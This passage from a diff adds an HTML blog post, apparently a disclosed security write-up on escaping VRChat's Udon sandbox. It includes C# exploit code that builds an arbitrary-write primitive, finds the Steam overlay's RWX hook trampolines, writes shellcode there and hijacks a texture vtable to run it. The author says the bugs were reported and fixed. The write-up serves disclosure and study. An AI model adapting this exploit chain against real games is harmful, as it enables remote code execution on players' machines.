+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">1</span><span>][</span><span style="color:#b5cea8;">0</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">32</span><span>) </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">1</span><span>][</span><span style="color:#b5cea8;">1</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">40</span><span>) </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">1</span><span>][</span><span style="color:#b5cea8;">2</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">48</span><span>) </span><span style="color:#569cd6;">|
+</span><span>            ((</span><span style="color:#569cd6;">ulong</span><span>)data[</span><span style="color:#b5cea8;">1</span><span>][</span><span style="color:#b5cea8;">3</span><span>] </span><span style="color:#569cd6;">&lt;&lt; </span><span style="color:#b5cea8;">56</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#569cd6;">private void </span><span>write64(</span><span style="color:#569cd6;">ulong </span><span>addr, </span><span style="color:#569cd6;">ulong </span><span>val)
+</span><span>{
+</span><span>    write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">0x128</span><span>, (</span><span style="color:#569cd6;">uint</span><span>)(addr </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFFFFFFF</span><span>));
+</span><span>    write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">0x12C</span><span>, (</span><span style="color:#569cd6;">uint</span><span>)(addr </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">32</span><span>));
+</span><span>
+</span><span>    </span><span style="color:#569cd6;">var </span><span>data = </span><span style="color:#569cd6;">new </span><span>Color32[</span><span style="color:#b5cea8;">2</span><span>]
+</span><span>    {
+</span><span>        </span><span style="color:#569cd6;">new </span><span>Color32((</span><span style="color:#569cd6;">byte</span><span>)(val </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">8</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">16</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">24</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>)),
+</span><span>        </span><span style="color:#569cd6;">new </span><span>Color32((</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">32</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">40</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">48</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>), (</span><span style="color:#569cd6;">byte</span><span>)((val </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">56</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>)),
+</span><span>    };
+</span><span>
+</span><span>    arbTex.SetPixels32(data);
+</span><span>}
+</span></code></pre>
+<p>Finally, I can use these primitives to set up a ROP chain and overwrite the target texture's vtable to pivot the stack and run shellcode.</p>
+<p>...</p>
+<p>...</p>
+<p>Despite <code>UnityPlayer.dll</code> being a relatively large binary and having plenty of ROP gadgets, I still don't really want to write a ROP chain if I don't have to. It would be nice if I had some convenient writable executable memory to write my shellcode to instead of having to write yet another <code>VirtualAlloc</code>/<code>VirtualProtect</code> ROP chain. (Un)fortunately, VRChat uses <a href="https://docs.unity3d.com/Manual/IL2CPP.html">IL2CPP</a>, which means all of the game's C# code is precompiled and there won't be anything from a JIT.</p>
+<p>Still, it can't hurt to check, right?</p>
+<p><img src="/img/vrcescape/rwx.png" alt="" /></p>
+<h1 id="why-rop-when-you-have-steam">Why ROP When You Have Steam<a class="zola-anchor" href="#why-rop-when-you-have-steam" aria-label="Anchor link for: why-rop-when-you-have-steam"><i class="fas fa-link"></i></a> 
+</h1>
+<p>Like most modern PC games, VRChat is on Steam, which has an in-game overlay accessible by pressing Shift+Tab. In order to be able to do this on almost every game without explicit integration from the original developers, the overlay DLL <em>(<code>GameOverlayRenderer64.dll</code>)</em> has to hook a few functions to intercept various things such as input. For some reason, it seems like Valve decided to write their own hooking library. The anatomy of a hooked function looks something like this:</p>
+<p><img src="/img/vrcescape/hook.svg" alt="" /></p>
+<p>The trampoline region is allocated within 2GB of the hooked function and exists because of an x86_64 limitation. Hooks usually want to overwrite as few instructions as possible in order to avoid issues, so a 5-byte jump is used for the initial hook jump.</p>
+<p>However, there's only 4 bytes for a signed relative offset and the destination is usually over 2GB away, which is why the hook has to "bounce" off of the trampoline region in order to reach it via a larger jump (6-byte instruction + 8-byte pointer). It also stores the instructions that the initial jump overwrote in order to make sure the hook can still call the original function.</p>
+<p>For some reason, Valve made the "interesting" design decision of making that trampoline region readable, writable, and executable at all times. This effectively turns these regions into free "Get Out of ROP Free" cards that exist on every 64-bit Steam game as long as the overlay is enabled.</p>
+<p>The screenshot also shows one of these trampoline regions being allocated for <code>xinput1_3.dll</code>, a DLL notoriously known for not having ASLR enabled for some reason. For this exploit, I didn't want to rely on that region always being at the same address because it's entirely possible that something else could take up that region of memory before XInput gets loaded or the hook gets installed. Besides, I didn't want this exploit chain to be <em>that</em> easy.</p>
+<p>Instead, I opted to get one of the hooked functions from <code>UnityPlayer.dll</code>'s import address table and read the jump instruction for the hook <em>(<code>jmp hook_entry</code>)</em> in order to find one of these magic RWX regions. This has the benefit of being able to check if the overlay is actually loaded before trying to write any shellcode instead of taking a leap of faith and blindly writing to a RWX region that may or may not be there. From here, code execution is trivial and the exploit is complete.</p>
+<pre data-lang="cs" style="background-color:#1e1e1e;color:#dcdcdc;" class="language-cs "><code class="language-cs" data-lang="cs"><span style="color:#569cd6;">private const uint </span><span>LOADLIBRARYEXW_RVA = </span><span style="color:#b5cea8;">0x185F658</span><span>;
+</span><span style="color:#569cd6;">private const uint </span><span>GETMODULEHANDLEA_RVA = </span><span style="color:#b5cea8;">0x185F6E8</span><span>;
+</span><span style="color:#569cd6;">private const uint </span><span>GETPROCADDRESS_RVA = </span><span style="color:#b5cea8;">0x185F7D0</span><span>;
+</span><span style="color:#569cd6;">private const uint </span><span>SCRATCH_RVA = </span><span style="color:#b5cea8;">0x1BF00B0</span><span>; </span><span style="color:#608b4e;">// Can be any random part of .data
+</span><span>
+</span><span style="color:#608b4e;">// Get LoadLibraryExW&#39;s address from UnityPlayer.dll&#39;s IAT
+</span><span style="color:#569cd6;">ulong </span><span>hook_addr = read64(unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>LOADLIBRARYEXW_RVA);
+</span><span>
+</span><span style="color:#608b4e;">// Find one of GameOverlayRenderer64&#39;s RWX trampoline regions using the hook jump
+</span><span style="color:#569cd6;">ulong </span><span>hook = read64(hook_addr);
+</span><span style="color:#569cd6;">if </span><span>((hook </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFF</span><span>) </span><span style="color:#569cd6;">!= </span><span style="color:#b5cea8;">0xE9</span><span>)
+</span><span>{
+</span><span>    Debug.LogError(</span><span style="color:#d69d85;">&quot;LoadLibraryExW isn&#39;t hooked by GameOverlayRenderer64&quot;</span><span>);
+</span><span>    </span><span style="color:#569cd6;">return</span><span>;
+</span><span>}
+</span><span style="color:#569cd6;">ulong </span><span>offset = (hook </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">8</span><span>) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFFFFFFF</span><span>;
+</span><span style="color:#569cd6;">ulong </span><span>target = hook_addr </span><span style="color:#569cd6;">+ </span><span>offset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">5</span><span>;
+</span><span style="color:#569cd6;">if </span><span>((offset </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0x80000000</span><span>) </span><span style="color:#569cd6;">!= </span><span style="color:#b5cea8;">0</span><span>)
+</span><span>    target </span><span style="color:#569cd6;">-= </span><span style="color:#b5cea8;">0x100000000</span><span>; </span><span style="color:#608b4e;">// UdonSharp doesn&#39;t support unchecked signed &lt;-&gt; unsigned conversion and it&#39;s REALLY ANNOYING
+</span><span>
+</span><span style="color:#608b4e;">// Write shellcode to the RWX region
+</span><span style="color:#569cd6;">for </span><span>(</span><span style="color:#569cd6;">int </span><span>i = </span><span style="color:#b5cea8;">0</span><span>; i </span><span style="color:#569cd6;">&lt; </span><span>shellcode.Length; i</span><span style="color:#569cd6;">++</span><span>)
+</span><span>{
+</span><span>    </span><span style="color:#608b4e;">// Replace placeholder values with addresses known at runtime
+</span><span>    </span><span style="color:#569cd6;">ulong </span><span>val = shellcode[i];
+</span><span>    </span><span style="color:#569cd6;">if </span><span>(val </span><span style="color:#569cd6;">== </span><span style="color:#b5cea8;">0x4141414141414141</span><span>)
+</span><span>        val = read64(unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>GETMODULEHANDLEA_RVA);
+</span><span>    </span><span style="color:#569cd6;">else if </span><span>(val </span><span style="color:#569cd6;">== </span><span style="color:#b5cea8;">0x4242424242424242</span><span>)
+</span><span>        val = read64(unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>GETPROCADDRESS_RVA);
+</span><span>    write64(target </span><span style="color:#569cd6;">+ </span><span>(</span><span style="color:#569cd6;">ulong</span><span>)i </span><span style="color:#569cd6;">* </span><span style="color:#b5cea8;">8</span><span>, val);
+</span><span>}
+</span><span>
+</span><span style="color:#608b4e;">// Put a fake vtable somewhere
+</span><span style="color:#608b4e;">// This points Texture3D::MainThreadCleanup to the shellcode
+</span><span>write64(unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>SCRATCH_RVA </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">8</span><span>, target);
+</span><span>
+</span><span style="color:#608b4e;">// Overwrite the arbitrary r/w texture&#39;s vtable pointer
+</span><span>write32Rel(arbTexOffset, (</span><span style="color:#569cd6;">uint</span><span>)((unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>SCRATCH_RVA) </span><span style="color:#569cd6;">&amp; </span><span style="color:#b5cea8;">0xFFFFFFFF</span><span>));
+</span><span>write32Rel(arbTexOffset </span><span style="color:#569cd6;">+ </span><span style="color:#b5cea8;">4</span><span>, (</span><span style="color:#569cd6;">uint</span><span>)((unityPlayerBase </span><span style="color:#569cd6;">+ </span><span>SCRATCH_RVA) </span><span style="color:#569cd6;">&gt;&gt; </span><span style="color:#b5cea8;">32</span><span>));
+</span><span>
+</span><span style="color:#608b4e;">// Call MainThreadCleanup by destroying the texture and run the shellcode!
+</span><span>Destroy(arbTex);
+</span></code></pre>
+<iframe width="100%" src="https://www.youtube-nocookie.com/embed/zQepvGpZFJc" frameborder="0" allowfullscreen style="aspect-ratio: 16/9;"></iframe>
+<p><em>(as for the title of the video, this really <a href="https://www.youtube.com/watch?v=3L89In9bzEA">wasn't the first time I did this</a>, but that writeup is lost to time...)</em></p>
+<p><em><strong>To Udon devs:</strong> This exploit was why <a href="https://feedback.vrchat.com/udon/p/the-texture2d-constructor-suddenly-does-not-support-most-textureformats">this regression</a> happened. A check was added for the texture constructors to make sure the size wouldn't overflow, but not every format was handled in the check. Sorry about that :(</em></p>
+<h1 id="honorable-mention">Honorable Mention<a class="zola-anchor" href="#honorable-mention" aria-label="Anchor link for: honorable-mention"><i class="fas fa-link"></i></a> 
+</h1>
+<p>This wasn't something I used in the final exploit, but I thought it was interesting enough to mention. While experimenting with large texture sizes, I noticed an interesting parameter in <code>Texture2D</code>'s constructor:</p>
+<p><img src="/img/vrcescape/susparam1.png" alt="" /></p>
+<p>Then I checked what was exposed in Udon:</p>
+<p><img src="/img/vrcescape/susparam2.png" alt="" /></p>
+<p>And I gave it a shot:</p>
+<p><img src="/img/vrcescape/uninit.png" alt="" /></p>
+<p>Yes, this really did allow reading uninitialized heap memory via intended Unity behavior. Thankfully, I didn't see any other obvious API whitelist oversights like this. <strong>Although these constructors are still exposed in the latest version, they now throw an exception if <code>createUninitialized</code> is enabled.</strong></p>
+<p>Thanks to Tupper, the rest of the VRChat team, and Unity for their cooperation in getting these vulnerabilities fixed.</p>
+
+    </section>
+    <footer>
+        <nav class="c-pagination p-pagination">
+            <div class="c-pagination__ctrl">
+                <div class="c-pagination__newer">
+                    
+                </div>
+                <div class="c-pagination__older">
+                    
+                </div>
+            </div>
+        </nav>
+    </footer>
+</article>
+        </main>
+
+     
+      <footer class="l-footer">
+          <p class="p-copyright">
+              
+              <strong>Duct taped together with ❤️</strong><br>Github: <a href="https://github.com/khang06">khang06</a> | Discord: khangaroo<br>Theme: Modified <a href="https://github.com/lukehsiao/zola-pickles">zola-pickles</a>
+          </p>
+      </footer>
+
+       
+      
+    </body>
+</html>
+            
